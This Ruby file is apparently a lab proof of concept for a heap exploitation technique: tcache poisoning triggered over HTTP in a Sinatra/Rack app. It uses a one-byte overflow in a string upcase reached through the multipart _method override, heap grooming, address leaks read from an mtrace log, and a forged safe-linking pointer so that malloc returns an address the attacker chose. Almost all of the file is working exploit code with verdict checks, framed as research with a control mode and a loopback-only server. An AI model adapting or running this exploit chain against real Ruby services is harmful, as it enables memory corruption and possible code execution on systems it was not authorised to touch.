# Stage C over HTTP — tcache poisoning on the Sinatra request thread.
#
# In-process stage C (lab/repro/ruby2shell-stageC.rb) is transplanted here
# onto the Stage B HTTP stack (lab/repro/ruby2shell-stageB-http.ru):
#   [S 0x370][V 0x430][T 0x3f0 in tcache][A 0x3f0 in tcache][dummy]
# The multipart `_method` part is upcased by Rack::MethodOverride (default
# middleware, no app code on the trigger path). The single 0x53 overflow
# byte inflates V (unsorted) to 0x450; the first 0x450-class allocation
# (our marker middleware) takes V, overlapping T's tcache `next`. We
# splice target ^ (T_entry>>12) there, then two "z"*1000 pops return
# T and the attacker-nominated address inside f_host. Both popped
# chunks need musable-safe headers: T's is repaired through the overlap
# and the target's fake header is pre-planted in f_host's own content.
#
# Address discovery is in-request: mtrace.so writes unbuffered malloc
# lines to fd 2 (the trace file); the groom middleware parses V's and
# f_host's addresses after ===ALLOC=== and computes the forged value in
# the same run that uses it. ASLR therefore never matters.
#
# Honest conditions (same as in-process): grooming and marker are ours;
# the trigger path is default Sinatra/Rack middleware; GC is disabled
# between the free sweep and the readback (an auto-GC would call
# malloc_usable_size on the attacked chunks); the target is nominated
# inside attacker-controlled string content. Loopback only.
gem 'sinatra', '4.2.2'
gem 'rack', '3.2.8'
gem 'rackup', '2.3.1'
gem 'webrick', '1.9.2'
require 'sinatra'

$control = !ENV['STAGEC_HTTP_CONTROL'].nil?
$trace_path = ENV['STAGEC_HTTP_TRACE']
raise 'STAGEC_HTTP_TRACE not set' unless $trace_path
$result = 'not-yet'
$f_host = nil
$t_content = nil
$drains = nil
$src = nil
$forged = nil
$target = nil
$v_addr = nil
$t_entry = nil
$ov = nil
$z1 = nil
$z2 = nil

def marker(s)
  STDERR.write(s)
  STDERR.flush
end

class GroomMiddleware
  def initialize(app)
    @app = app
  end

  def scrub
    nil
  end

  def groom!(env)
    # Force multipart parsing BEFORE the class drains: parser allocations
    # must not land inside the layout we are about to build (stageB-http
    # evidence: an unparsed request's mid-groom malloc split unsorted V).
    begin
      Rack::Request.new(env).POST
    rescue StandardError
    end

    GC.start
    $drains = [
      Array.new(512) { "e" * 840 },   # 0x360
      Array.new(512) { "d" * 856 },   # 0x370
      Array.new(512) { "t" * 1000 },  # 0x3f0
      Array.new(512) { "v" * 1048 },  # 0x430
      Array.new(512) { "w" * 1096 },  # 0x460
    ]
    # T's fake next-chunk header at user 0x10..0x1f survives its free
    # (tcache clobbers only user 0..0xf: fd + key).
    $t_content = ("W" * 16) +
                 "\x50\x04\x00\x00\x00\x00\x00\x00" + # fake prev_size 0x450
                 "\x90\x00\x00\x00\x00\x00\x00\x00" + # fake size 0x90, !prev_inuse
                 ("A" * 968)
    raise "t_content len #{$t_content.bytesize}" unless $t_content.bytesize == 1000

    marker("===ALLOC===\n")
    s_chunk = "d" * 856             # S 0x370
    v_chunk = "v" * 1048            # V 0x430, unsorted later
    t_live  = $t_content + ""       # T 0x3f0, fresh copy (not COW dup)
    a_chunk = "q" * 1000            # A 0x3f0, count guard
    dummy   = "e" * 840             # 0x360, buffer2 stock
    $f_host = ("F" * 0xf0) +
              [0, 0x3f1].pack("Q<Q<") +       # fake chunk header at f+0xf0
              ("F" * 0x3e8) +
              [0x3f1].pack("Q<") +            # fake next-size at f+0x4e8
              ("F" * (4000 - 0x4f0))
    raise "f_host len #{$f_host.bytesize}" unless $f_host.bytesize == 4000

    # Parse the trace this process is writing (first 0x419 and 0xfa1
    # after the marker), exactly as the in-process driver does.
    in_alloc = false
    File.foreach($trace_path) do |line|
      in_alloc = true if line.include?("===ALLOC===")
      next unless in_alloc
      if line =~ /\AM \d+ 419 ([0-9a-f]+)/ && $v_addr.nil?
        $v_addr = $1.to_i(16)
      elsif line =~ /\AM \d+ fa1 ([0-9a-f]+)/ && $f_host_addr.nil?
        $f_host_addr = $1.to_i(16)
      end
      break if $v_addr && $f_host_addr
    end
    raise "trace parse failed v=#{$v_addr} f=#{$f_host_addr}" unless
      $v_addr && $f_host_addr

    $t_entry = $v_addr + 0x430
    $target = $f_host_addr + 0x100
    $forged = [$target ^ ($t_entry >> 12)].pack("Q<")
    marker("V-addr=0x#{$v_addr.to_s(16)}\n")
    marker("T-entry=0x#{$t_entry.to_s(16)}\n")
    marker("target=0x#{$target.to_s(16)}\n")

    $src = if $control
             ("\xDF".b * 828)          # no parity flip -> no overflow
           else
             ("a".b + "\xDF".b * 827)
           end
    $src.force_encoding(Encoding::ISO_8859_1)

    marker("===FREE===\n")
    s_chunk = nil; v_chunk = nil; t_live = nil; a_chunk = nil; dummy = nil
    scrub; scrub; scrub
    GC.start   # A -> tcache[0x3f0] count 1, T -> head count 2,
               # V -> unsorted, S/dummy -> their tcache classes.
    GC.disable # T's header is about to be clobbered by the marker fill;
               # an auto-GC would call malloc_usable_size on it before
               # the repair lands. Same honest condition as in-process.
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      groom!(env)
    end
    @app.call(env)
  end
end

# Runs inside Sinatra's user-middleware chain, immediately after
# Rack::MethodOverride: the upcase result-malloc has just binned the
# inflated V at 0x450. First 0x450-class malloc takes V; splice and
# repair, then pop tcache[0x3f0] twice and read the live f_host back.
class MarkerMiddleware
  def initialize(app)
    @app = app
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      marker("===MARK===\n")
      $ov = "m" * 1080         # chunk 0x450 exact fit -> V
      $ov.force_encoding(Encoding::ASCII_8BIT)
      $ov[1072, 8] = $forged  # T's tcache `next` (V+0x430..0x437)
      $ov[1056, 16] = [0x450, 0x3f1].pack("Q<Q<")
                             # restore T's chunk header: prev_size 0x450,
                             # size 0x3f0|PREV_INUSE (musable-safe on pop1)

      marker("===POPS===\n")
      marker("forged-hex=#{$forged.unpack1('H*')}\n")
      marker("ov-t-hdr-and-next=#{$ov.byteslice(1040, 40).unpack1('H*')}\n")
      marker("f-host-before=#{$f_host.byteslice(0x100, 8).unpack1('H*')}\n")
      $z1 = "z" * 1000        # pop1 -> T (header repaired)
      $z2 = "z" * 1000        # pop2 -> nominated address inside f_host

      hit  = $f_host.byteslice(0x100, 8)
      pre  = $f_host.byteslice(0, 8)
      size = $f_host.byteslice(0xf8, 8)
      attack = !$control
      expected_hit = attack ? "z" * 8 : "F" * 8
      expected_size = "\xf1\x03".b + ("\x00" * 6)
      verdict =
        if hit == expected_hit && pre == "F" * 8 && size == expected_size
          attack ? "poisoned" : "clean"
        else
          "UNEXPECTED"
        end
      marker("F-readback-hex=#{$f_host.byteslice(0x100, 16).unpack1('H*')}\n")
      marker("fake-size-hex=#{size.unpack1('H*')}\n")
      marker("verdict=#{verdict}\n")
      $result = "target=0x#{$target.to_s(16)} verdict=#{verdict} " \
                "F-readback-hex=#{$f_host.byteslice(0x100, 16).unpack1('H*')} " \
                "f-pre=#{pre.unpack1('H*')} fake-size=#{size.unpack1('H*')}"

      if !attack
        # Control bins are honest; full teardown proves no abort.
        $ov = nil; $z1 = nil; $z2 = nil; $f_host = nil
        GC.enable
        GC.start
        $result += " NO-ABORT"
      end
    end
    @app.call(env)
  end
end

use MarkerMiddleware
set :show_exceptions, false

before do
  content_type 'text/plain'
end

post '/trigger' do
  # MarkerMiddleware has already completed the chain and set $result;
  # return it here so the readback is observable in the HTTP response
  # even when the worker thread later aborts during tcache teardown.
  "triggered control=#{$control} #{$result}\n"
end

get '/mark' do
  "#{$result}\n"
end

require 'rackup/handler/webrick'
Sinatra::Application.set(:run, false)
app = GroomMiddleware.new(Sinatra::Application.new)
Rackup::Handler::WEBrick.run(app, Host: '127.0.0.1', Port: 4548)
